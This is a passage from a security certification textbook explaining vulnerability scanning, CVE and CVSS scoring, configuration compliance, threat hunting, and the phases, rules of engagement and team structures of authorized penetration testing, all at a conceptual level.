The main types of security assessment are usually classed as vulnerability assessment, threat hunting, and penetration testing. A vulnerability assessment is an evaluation of a system's security and ability to meet compliance requirements based on the configuration state of the system. Essentially, the vulnerability assessment determines if the current configuration matches the ideal configuration (the baseline). Vulnerability assessments might involve manual inspection of security controls, but are more often accomplished through automated vulnerability scanners.
## VULNERABILITY SCAN TYPES

An automated scanner must be configured with signatures and scripts that can correlate known software and configuration vulnerabilities with data gathered from each host. Consequently, there are several types of vulnerability scanners optimized for different tasks.

### Network Vulnerability Scanner

A network vulnerability scanner, such as Tenable Nessus ([tenable.com/products/nessus](https://www.tenable.com/products/nessus)) or OpenVAS ([openvas.org](https://www.openvas.org/)), is designed to test network hosts, including client PCs, mobile devices, servers, routers, and switches. It examines an organization's on-premises systems, applications, and devices and compares the scan results to configuration templates plus lists of known vulnerabilities. Typical results from a vulnerability assessment will identify missing patches, deviations from baseline configuration templates, and other related vulnerabilities. 

![Dashboard shows 5 graphs titled Tasks by Severity Class, Tasks by status, CVEs by creation time, Hosts topology, and NVTs by Severity Class.](https://s3.amazonaws.com/wmx-api-production/courses/5731/images/9230-1599771795158.png)

Greenbone OpenVAS vulnerability scanner with Security Assistant web application interface as installed on Kali Linux. (Screenshot used with permission from Greenbone Networks, [http://www.openvas.org](http://www.openvas.org/).)

The first phase of scanning might be to run a detection scan to discover hosts on a particular IP subnet. In the next phase of scanning, a target range of hosts is probed to detect running services, patch level, security configuration and policies, network shares, unused accounts, weak passwords, antivirus configuration, and so on.

Each scanner is configured with a database of known software and configuration vulnerabilities. The tool compiles a report about each vulnerability in its database that was found to be present on each host. Each identified vulnerability is categorized and assigned an impact warning. Most tools also suggest remediation techniques. This information is highly sensitive, so use of these tools and the distribution of the reports produced should be restricted to authorized hosts and user accounts.

Network vulnerability scanners are configured with information about known vulnerabilities and configuration weaknesses for typical network hosts. These scanners will be able to test common operating systems, desktop applications, and some server applications. This is useful for general purpose scanning, but some types of applications might need more rigorous analysis.

### Application and Web Application Scanners

A dedicated application scanner is configured with more detailed and specific scripts to test for known attacks, as well as scanning for missing patches and weak configurations. The best known class of application scanners are web application scanners. Tools such as Nikto ([cirt.net/Nikto2](https://cirt.net/Nikto2)) look for known web exploits, such as SQL injection and cross-site scripting (XSS), and may also analyze source code and database security to detect unsecure programming practices. Other types of application scanners would be optimized for a particular class of software, such as a database server.
## COMMON VULNERABILITIES AND EXPOSURES

An automated scanner needs to be kept up to date with information about known vulnerabilities. This information is often described as a vulnerability feed, though the Nessus tool refers to these feeds as _plug-ins,_ and OpenVAS refers to them as _network vulnerability tests (NVTs)._ Often, the vulnerability feed forms an important part of scan vendors' commercial models, as the latest updates require a valid subscription to acquire.

![](https://s3.amazonaws.com/wmx-api-production/courses/5731/images/2799-1599771795293.png)

Checking feed status in the Greenbone Community Edition vulnerability manager. (Screenshot: Greenbone Community Edition [greenbone.net/en/community-edition](https://www.greenbone.net/en/community-edition).)

Vulnerability feeds make use of common identifiers to facilitate sharing of intelligence data across different platforms. Many vulnerability scanners use the Secure Content Automation Protocol (SCAP) to obtain feed or plug-in updates ([scap.nist.gov](https://csrc.nist.gov/projects/security-content-automation-protocol/)). As well as providing a mechanism for distributing the feed, SCAP defines ways to compare the actual configuration of a system to a target-secure baseline plus various systems of common identifiers. These identifiers supply a standard means for different products to refer to a vulnerability or platform consistently.

Common Vulnerabilities and Exposures (CVE) is a dictionary of vulnerabilities in published operating systems and applications software ([cve.mitre.org](https://cve.mitre.org/)). There are several elements that make up a vulnerability's entry in the CVE:

-   An identifier in the format: CVE-YYYY-####, where YYYY is the year the vulnerability was discovered, and #### is at least four digits that indicate the order in which the vulnerability was discovered.
-   A brief description of the vulnerability.
-   A reference list of URLs that supply more information on the vulnerability.
-   The date the vulnerability entry was created.

The CVE dictionary provides the principal input for NIST's National Vulnerability Database ([nvd.nist.gov](https://nvd.nist.gov/)). The NVD supplements the CVE descriptions with additional analysis, a criticality metric, calculated using the Common Vulnerability Scoring System (CVSS), plus fix information.

CVSS is maintained by the Forum of Incident Response and Security Teams ([first.org/cvss](https://www.first.org/cvss)). CVSS metrics generate a score from 0 to 10 based on characteristics of the vulnerability, such as whether it can be triggered remotely or needs local access, whether user intervention is required, and so on. The scores are banded into descriptions too:

Score

  Description  

0.1+

Low

4.0+

Medium

7.0+

High

9.0+

Critical
## INTRUSIVE VERSUS NON-INTRUSIVE SCANNING

A network vulnerability scanner can be implemented purely as software or as a security appliance, connected to the network. Some scanners work remotely by contacting the target host over the network. Other scanner types use agents installed locally on each host to perform the scanning and transmit a report to a management server. For example, Nessus Professional allows remote scanning of hosts while Nessus Manager, and Tenable Cloud can work with locally installed agent software.

![Screenshot shows "+ New Scan" selected in navigation pane, and My Scans page with 1 entry: Agent Scan Scheduled, On Demand, January 16 (checkmarked).](https://s3.amazonaws.com/wmx-api-production/courses/5731/images/3800-1599771795334.png)

Nessus Manager web management interface. (Screenshot used with permission from Tenable Network Security.)

_Scan intrusiveness_ is a measure of how much the scanner interacts with the target. Non-intrusive (or passive) scanning means analyzing indirect evidence, such as the types of traffic generated by a device. A passive scanner, the Zeek Network Security Monitor ([zeek.org](https://zeek.org/)) being one example, analyzes a network capture and tries to identify policy deviations or CVE matches. This type of scanning has the least impact on the network and on hosts, but is less likely to identify vulnerabilities comprehensively. Passive scanning might be used by a threat actor to scan a network stealthily. You might use passive scanning as a technique where active scanning poses a serious risk to system stability, such as scanning print devices, VoIP handsets, or embedded systems networks.

_Active scanning_ means probing the device's configuration using some sort of network connection with the target. Active scanning consumes more network bandwidth and runs the risk of crashing the target of the scan or causing some other sort of outage. Agent-based scanning is also an active technique.

The most intrusive type of vulnerability scanner does not stop at detecting a vulnerability. Exploitation frameworks contain default scripts to try to use a vulnerability to run code or otherwise gain access to the system. This type of highly intrusive testing is more typical of penetration testing than automated vulnerability scanning.
## CREDENTIALED VERSUS NON-CREDENTIALED SCANNING

A non-credentialed scan is one that proceeds by directing test packets at a host without being able to log on to the OS or application. The view obtained is the one that the host exposes to an unprivileged user on the network. The test routines may be able to include things such as using default passwords for service accounts and device management interfaces, but they are not given privileged access. While you may discover more weaknesses with a credentialed scan, you sometimes will want to narrow your focus to think like an attacker who doesn't have specific high-level permissions or total administrative access. Non-credentialed scanning is often the most appropriate technique for external assessment of the network perimeter or when performing web application scanning.

A credentialed scan is given a user account with logon rights to various hosts, plus whatever other permissions are appropriate for the testing routines. This sort of test allows much more in-depth analysis, especially in detecting when applications or security settings may be misconfigured. It also shows what an insider attack, or one where the attacker has compromised a user account, may be able to achieve. A credentialed scan is a more intrusive type of scan than non-credentialed scanning.

![Screenshot of New Credential page.](https://s3.amazonaws.com/wmx-api-production/courses/5731/images/5192-1599771795462.png)

Configuring credentials for use in target (scope) definitions in Greenbone OpenVAS as installed on Kali Linux. (Screenshot used with permission from Greenbone Networks, [http://www.openvas.org](http://www.openvas.org/).)

Create dedicated network accounts for use by the vulnerability scanner only. Ensure that the credentials for these accounts are stored securely on the scan server.
## FALSE POSITIVES, FALSE NEGATIVES, AND LOG REVIEW

A scanning tool will generate a summary report of all vulnerabilities discovered during the scan directly after execution completes. These reports color-code vulnerabilities in terms of their criticality, with red typically denoting a weakness that requires immediate attention. You can usually view vulnerabilities by scope (most critical across all hosts) or by host. The report should include or link to specific details about each vulnerability and how hosts can be remediated.

![](https://s3.amazonaws.com/wmx-api-production/courses/5731/images/8445-1599771795566.png)

Scan report listing multiple high-severity vulnerabilities found in a Windows host. (Screenshot: Greenbone Community Edition [greenbone.net/en/community-edition](https://www.greenbone.net/en/community-edition).)

Intrusive/active scanning is more likely to detect a wider range of vulnerabilities in host systems and can reduce false positives. A _false positive_ is something that is identified by a scanner or other assessment tool as being a vulnerability, when in fact it is not. For example, assume that a vulnerability scan identifies an open port on the firewall. Because a certain brand of malware has been known to use this port, the tool labels this as a security risk, and recommends that you close the port. However, the port is not open on your system. Researching the issue costs time and effort, and if excessive false positives are thrown by a vulnerability scan, it is easy to disregard the scans entirely, which could lead to larger problems.

You should also be alert to the possibility of _false negatives—_that is, potential vulnerabilities that are not identified in a scan. This risk can be mitigated somewhat by running repeat scans periodically and by using scanners from more than one vendor. Also, because automated scan plug-ins depend on pre-compiled scripts, they do not reproduce the success that a skilled and determined hacker might be capable of and can therefore create a false sense of security.

Reviewing related system and network logs can enhance the vulnerability report validation process. As an example, assume that your vulnerability scanner identified a running process on a Windows machine. According to the scanner, the application that creates this process is known to be unstable, causing the operating system to lock up and crash other processes and services. When you search the computer's event logs, you notice several entries over the past couple of weeks indicate the process has failed. Additional entries show that a few other processes fail right after. In this instance, you've used a relevant data source to help confirm that the vulnerability alert is, in fact, valid.
## CONFIGURATION REVIEW

As well as matching known software exploits to the versions of software found running on a network, a vulnerability scan assesses the configuration of security controls and application settings and permissions compared to established benchmarks. It might try to identify whether there is a lack of controls that might be considered necessary or whether there is any misconfiguration of the system that would make the controls less effective or ineffective, such as antivirus software not being updated, or management passwords left configured to the default. Generally speaking, this sort of testing requires a credentialed scan. It also requires specific information about best practices in configuring the particular application or security control. These are provided by listing the controls and appropriate configuration settings in a template.

_Security content automation protocol (SCAP)_ allows compatible scanners to determine whether a computer meets a configuration baseline. SCAP uses several components to accomplish this function, but some of the most important are:

-   Open Vulnerability and Assessment Language (OVAL)—an XML schema for describing system security state and querying vulnerability reports and information.
-   Extensible Configuration Checklist Description Format (XCCDF)—an XML schema for developing and auditing best-practice configuration checklists and rules. Previously, best-practice guides might have been written in prose for system administrators to apply manually. XCCDF provides a machine-readable format that can be applied and validated using compatible software.

![Top pane is a listing of items with headers Policy Type, Policy Group or Registry Key, Policy Setting, 515support, and Template. Highlighted item in top pane shows policy type as “Security Temp...”, policy group or registry key as “System Access”, policy setting as “MinimumPasswordLength”, 515support as “7”, and Template as “14”. Bottom pane has sections for Policy path, 515support, and Template. Both 515support and Template sections have subheadings Option, GPO, and File.](https://s3.amazonaws.com/wmx-api-production/courses/5731/images/1514-1599771795756.png)

Comparing a local network security policy to a template. The minimum password length set in the local policy is much less than is recommended in the template. (Screenshot used with permission from Microsoft.)

Some scanners measure systems and configuration settings against best practice frameworks. This is referred to as a compliance scan. This might be necessary for regulatory compliance or you might voluntarily want to conform to externally agreed standards of best practice.

![Screenshot of Scan Library shows 2 sections, Scanner Templates (17 items) and Agent Templates (5 items).](https://s3.amazonaws.com/wmx-api-production/courses/5731/images/5552-1599771795885.png)

Scan templates supporting compliance scans in Nessus Manager. (Screenshot used with permission from Tenable Network Security.)

## THREAT HUNTING

Where vulnerability scanning uses lists of patches and standard definitions of baseline configurations, _threat hunting_ is an assessment technique that utilizes insights gained from threat intelligence to proactively discover whether there is evidence of TTPs already present within the network or system. This contrasts with a reactive process that is only triggered when alert conditions are reported through an incident management system. You can also contrast threat hunting with penetration testing. Where a pen test attempts to achieve some sort of system intrusion or concrete demonstration of weakness, threat hunting is based only on analysis of data within the system. To that extent, it is less potentially disruptive than pen testing.

A threat hunting project is likely to be led by senior security analysts, but some general points to observe include:

-   Advisories and bulletins—threat hunting is a labor-intensive activity and so needs to be performed with clear goals and resources. Threat hunting usually proceeds according to some hypothesis of possible threat. Security bulletins and advisories from vendors and security researchers about new TTPs and/or vulnerabilities may be the trigger for establishing a threat hunt. For example, if threat intelligence reveals that Windows desktops in many companies are being infected with a new type of malware that is not being blocked by any current malware definitions, you might initiate the following threat-hunting plan to detect whether the malware is also infecting your systems.
-   Intelligence fusion and threat data—threat hunting can be performed by manual analysis of network and log data, but this is a very lengthy process. An organization with a security information and event management (SIEM) and threat analytics platform can apply intelligence fusion techniques. The analytics platform is kept up to date with a TTP and IoC threat data feed. Analysts can develop queries and filters to correlate threat data against on-premises data from network traffic and logs. This process may also be partially or wholly automated using AI-assisted analysis and correlation.
-   Maneuver—when investigating a suspected live threat, you must remember the adversarial nature of hacking. A capable threat actor is likely to have anticipated the likelihood of threat hunting, and attempted to deploy countermeasures to frustrate detection. For example, the attacker may trigger a DDoS attack to divert the security team's attention, and then attempt to accelerate plans to achieve actions on objectives. Maneuver is a military doctrine term relating to obtaining positional advantage ([ccdcoe.org/uploads/2012/01/3_3_Applegate_ThePrincipleOfManeuverInCyberOperations.pdf](https://wmx-api-production.s3.amazonaws.com/courses/5731/supplementary/3_3_Applegate_ThePrincipleOfManeuverInCyberOperations.pdf)). As an example of defensive maneuver, threat hunting might use passive discovery techniques so that threat actors are given no hint that an intrusion has been discovered before the security team has a containment, eradication, and recovery plan.
# 3D
## EXAM OBJECTIVES COVERED

1.8 Explain the techniques used in penetration testing

Automated vulnerability scanning does not test what a highly capable threat actor might be able to achieve. Penetration testing is a type of assessment that adopts known tactics and techniques to attempt intrusions. Devising, planning, and leading penetration tests is a specialized security role, but at a junior level you are likely to participate in this type of engagement, so you should be able to explain the fundamental principles.

## PENETRATION TESTING

A penetration test—often shortened to _pen test_—uses authorized hacking techniques to discover exploitable weaknesses in the target's security systems. Pen testing is also referred to as _ethical hacking._ A pen test might involve the following steps:

-   Verify a threat exists—use surveillance, social engineering, network scanners, and vulnerability assessment tools to identify a vector by which vulnerabilities could be exploited.
-   Bypass security controls—look for easy ways to attack the system. For example, if the network is strongly protected by a firewall, is it possible to gain physical access to a computer in the building and run malware from a USB stick?
-   Actively test security controls—probe controls for configuration weaknesses and errors, such as weak passwords or software vulnerabilities.
-   Exploit vulnerabilities—prove that a vulnerability is high risk by exploiting it to gain access to data or install backdoors.

The key difference from passive vulnerability assessment is that an attempt is made to actively test security controls and exploit any vulnerabilities discovered. Pen testing is an intrusive assessment technique. For example, a vulnerability scan may reveal that an SQL Server has not been patched to safeguard against a known exploit. A penetration test would attempt to use the exploit to perform code injection and compromise and "own" (or "pwn" in hacker idiom) the server. This provides active testing of security controls. Even though the potential for the exploit exists, in practice the permissions on the server might prevent an attacker from using it. This would not be identified by a vulnerability scan, but should be proven or not proven to be the case by penetration testing.

## RULES OF ENGAGEMENT 

Security assessments might be performed by employees or may be contracted to consultants or other third parties. Rules of engagement specify what activity is permitted or not permitted. These rules should be made explicit in a contractual agreement. For example, a pen test should have a concrete objective and scope rather than a vague type of "Break into the network" aim. There may be systems and data that the penetration tester should not attempt to access or exploit. Where a pen test involves third-party services (such as a cloud provider), authorization to conduct the test must also be sought from the third party.

The Pentest-Standard website provides invaluable commentary on the conduct of pen tests ([pentest-standard.readthedocs.io/en/latest/tree.html](https://pentest-standard.readthedocs.io/en/latest/tree.html)).

### Attack Profile

Attacks come from different sources and motivations. You may wish to test both resistance to external (targeted and untargeted) and insider threats. You need to determine how much information about the network to provide to the consultant:

-   Black box (or unknown environment)—the consultant is given no privileged information about the network and its security systems. This type of test would require the tester to perform a reconnaissance phase. Black box tests are useful for simulating the behavior of an external threat.
-   White box (or known environment)—the consultant is given complete access to information about the network. This type of test is sometimes conducted as a follow-up to a black box test to fully evaluate flaws discovered during the black box test. The tester skips the reconnaissance phase in this type of test. White box tests are useful for simulating the behavior of a privileged insider threat.
-   Gray box (or partially known environment)—the consultant is given some information; typically, this would resemble the knowledge of junior or non-IT staff to model particular types of insider threats. This type of test requires partial reconnaissance on the part of the tester. Gray box tests are useful for simulating the behavior of an unprivileged insider threat.

A test where the attacker has no knowledge of the system but where staff are informed that a test will take place is referred to as a _blind_ (or _single-blind_) test. A test where staff are not made aware that a pen test will take place is referred to as a _double-blind test._

### Bug Bounty

A bug bounty is a program operated by a software vendor or website operator where rewards are given for reporting vulnerabilities. Where a pen test is performed on a contractual basis, costed by the consultant, a bug bounty program is a way of crowd sourcing detection of vulnerabilities. Some bug bounties are operated as internal programs, with rewards for employees only. Most are open to public submissions ([tripwire.com/state-of-security/security-data-protection/cyber-security/essential-bug-bounty-programs](https://www.tripwire.com/state-of-security/security-data-protection/cyber-security/essential-bug-bounty-programs/)).
## EXERCISE TYPES

Some of the techniques used in penetration testing may also be employed as an exercise between two competing teams:

-   Red team—performs the offensive role to try to infiltrate the target.
-   Blue team—performs the defensive role by operating monitoring and alerting controls to detect and prevent the infiltration.

There will also often be a white team, which sets the rules of engagement and monitors the exercise, providing arbitration and guidance, if necessary. If the red team is third party, the white team will include a representative of the consultancy company. One critical task of the white team is to halt the exercise should it become too risky. For example, an actual threat actor may attempt to piggyback a backdoor established by the red team.

In a red versus blue team exercise, the typical process is for the red team to attempt the intrusion and either succeed or fail, and then to write a summary report. This confrontational structure does not always promote constructive development and improvement. In a purple team exercise, the red and blue teams meet for regular debriefs while the exercise is ongoing. The red team might reveal where they have been successful and collaborate with the blue team on working out a detection mechanism. This process might be assisted by purple team members acting as facilitators. The drawback of a purple team exercise is that without blind or double-blind conditions, there is no simulation of a hostile adversary and the stresses of dealing with that.
## PASSIVE AND ACTIVE RECONNAISSANCE

Analysis of adversary TTPs has established various "kill chain" models of the way modern cyber-attacks are conducted. A penetration testing engagement will generally use the same sort of techniques.

In the first reconnaissance phase for black box testing, the pen tester establishes a profile of the target of investigation and surveys the attack surface for weaknesses. Reconnaissance activities can be classed as passive or active. Passive reconnaissance is not likely to alert the target of the investigation as it means querying publicly available information. Active reconnaissance has more risk of detection. Active techniques might involve gaining physical access to premises or using scanning tools on the target's web services and other networks.

-   Open Source Intelligence (OSINT)—using web search tools, social media, and sites that scan for vulnerabilities in Internet-connected devices and services ([securitytrails.com/blog/osint-tools](https://securitytrails.com/blog/osint-tools)) to obtain information about the target. OSINT aggregation tools, such as theHarvester ([github.com/laramies/theHarvester](https://github.com/laramies/theHarvester)), collect and organize this data from multiple sources. OSINT requires almost no privileged access as it relies on finding information that the company makes publicly available, whether intentionally or not. This is a passive technique.
-   Social engineering—this refers to obtaining information, physical access to premises, or even access to a user account through the art of persuasion. While the amount of interaction may vary, this can be classed as an active technique.
-   **Footprinting**—using software tools, such as Nmap ([nmap.org](https://nmap.org/)), to obtain information about a host or network topology. Scans may be launched against web hosts or against wired or wireless network segments, if the attacker can gain physical access to them. While passive footprinting is possible (by limiting it to packet sniffing), most scan techniques require active network connections with the target that can be picked up by detection software.
-   War driving—mapping the location and type (frequency channel and security method) of wireless networks operated by the target. Some of these networks may be accessible from outside the building. Simply sniffing the presence of wireless networks is a passive activity, though there is the risk of being observed by security guards or cameras. An attacker might be able to position rogue access points, such as the Hak5 Pineapple ([shop.hak5.org/products/wifi-pineapple](https://shop.hak5.org/products/wifi-pineapple)), or perform other wireless attacks using intelligence gathered from war driving.
-   Drones/unmanned aerial vehicle (UAV)—allow the tester to reconnoiter campus premises, and even to perform war driving from the air (war flying). A tool such as the Wi-Fi Pineapple can easily be incorporated on a drone ([hackaday.com/2018/05/27/watch-dogs-inspired-hacking-drone-takes-flight](https://hackaday.com/2018/05/27/watch-dogs-inspired-hacking-drone-takes-flight/)). Drones also provide a vector for one enduringly popular social engineering technique; dropping infected USB media around premises, with the expectation that at least some of them will be picked up and used ([blackhat.com/docs/us-16/materials/us-16-Bursztein-Does-Dropping-USB-Drives-In-Parking-Lots-And-Other-Places-Really-Work.pdf](https://wmx-api-production.s3.amazonaws.com/courses/5731/supplementary/us-16-Bursztein-Does-Dropping-USB-Drives-In-Parking-Lots-And-Other-Places-Really-Work.pdf)).
## PEN TEST ATTACK LIFE CYCLE

In the kill chain attack life cycle, reconnaissance is followed by an initial exploitation phase where a software tool is used to gain some sort of access to the target's network. This foothold might be accomplished using a phishing email and payload or by obtaining credentials via social engineering. Having gained the foothold, the pen tester can then set about securing and widening access. A number of techniques are required:

-   Persistence—the tester's ability to reconnect to the compromised host and use it as a remote access tool (RAT) or backdoor. To do this, the tester must establish a command and control (C2 or C&C) network to use to control the compromised host, upload additional attack tools, and download exfiltrated data. The connection to the compromised host will typically require a malware executable to run after shut down/log off events and a connection to a network port and the attacker's IP address to be available.
-   Privilege escalation—persistence is followed by further reconnaissance, where the pen tester attempts to map out the internal network and discover the services running on it and accounts configured to access it. Moving within the network or accessing data assets are likely to require higher privilege levels. For example, the original malware may have run with local administrator privileges on a client workstation or as the Apache user on a web server. Another exploit might allow malware to execute with system/root privileges, or to use network administrator privileges on other hosts, such as application servers.
-   Lateral movement—gaining control over other hosts. This is done partly to discover more opportunities to widen access (harvesting credentials, detecting software vulnerabilities, and gathering other such "loot"), partly to identify where valuable data assets might be located, and partly to evade detection. Lateral movement usually involves executing the attack tools over remote process shares or using scripting tools, such as PowerShell.
-   Pivoting—hosts that hold the most valuable data are not normally able to access external networks directly. If the pen tester achieves a foothold on a perimeter server, a pivot allows them to bypass a network boundary and compromise servers on an inside network. A pivot is normally accomplished using remote access and tunneling protocols, such as Secure Shell (SSH), virtual private networking (VPN), or remote desktop.
-   Actions on Objectives—for a threat actor, this means stealing data from one or more systems (data exfiltration). From the perspective of a pen tester, it would be a matter of the scope definition whether this would be attempted. In most cases, it is usually sufficient to show that actions on objectives could be achieved.
-   Cleanup—for a threat actor, this means removing evidence of the attack, or at least evidence that could implicate the threat actor. For a pen tester, this phase means removing any backdoors or tools and ensuring that the system is not less secure than the pre-engagement state.